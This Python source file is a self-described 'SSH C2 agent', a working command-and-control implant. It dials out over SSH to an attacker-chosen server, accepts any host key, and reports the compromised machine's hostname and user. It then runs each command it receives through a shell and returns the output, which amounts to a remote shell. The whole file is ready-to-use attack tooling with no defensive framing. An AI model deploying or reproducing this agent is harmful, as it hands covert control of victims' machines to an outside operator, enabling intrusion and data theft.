import paramiko
import subprocess
import sys
import os
import socket
import getpass
import argparse
#import shlex

parser = argparse.ArgumentParser(description="SSH C2 agent configuration to communicate with server")
parser._action_groups.pop()
required = parser.add_argument_group('Required')
optional = parser.add_argument_group('Optional')
required.add_argument("-ip", dest="ip", help="Server IP")
optional.add_argument("-p", dest="port", type=int, default=2222, help="Server port (Default: 2222)")
optional.add_argument("-u", dest="user", default="sshUser", help="User to authenticate (Default: sshUser)")
optional.add_argument("-pwd", dest="password", default="sshPass", help="Password to authenticate (Default: sshPass)")

if (len(sys.argv) == 1):
    parser.print_help(sys.stderr)
    sys.exit()

args = parser.parse_args()

def SSH_comm():
    ip = args.ip #Server IP
    port = args.port #Server port
    username = args.user #Server username
    password = args.password #Server password
    try:
        SSH = paramiko.SSHClient()
        SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        SSH.connect(ip, port=port, username=username, password=password)
        start_session = SSH.get_transport().open_session()
        host = socket.gethostname()
        user = getpass.getuser()
    except Exception as ex:
        print('[!] Error, possible invalid sever details. Use -h for help.')
        #print('Debug info:\n' + str(ex))
        sys.exit()

    if start_session.active:
        start_session.send(f'[*] Agent checked in from \"{host}\" as \"{user}\".\n')
        print(start_session.recv(1024).decode())
        while True:
            incoming = start_session.recv(1024)
            try:
                command = incoming.decode()
                if command == 'exit':
                    sys.exit()
                if command.split(" ")[0] == 'cd':
                    path = command.split(" ")[1]
                    os.chdir(path)
                    CWD = os.getcwd()
                    start_session.send(f'[*] Changed directory to {CWD}\n')
                else:
                    #command_out = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=True)
                    command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                    #print(command)
                    if (len(command_out) == 0):
                        start_session.send("[*] Command executed. No shell output.\n")
                    else:
                        start_session.send(command_out)
            except Exception as ex:
                start_session.send('[!] ' + str(ex) + '\n')
                pass
    return

if __name__ == "__main__":
    try:
        SSH_comm()
    except Exception as ex:
        print(str(ex))
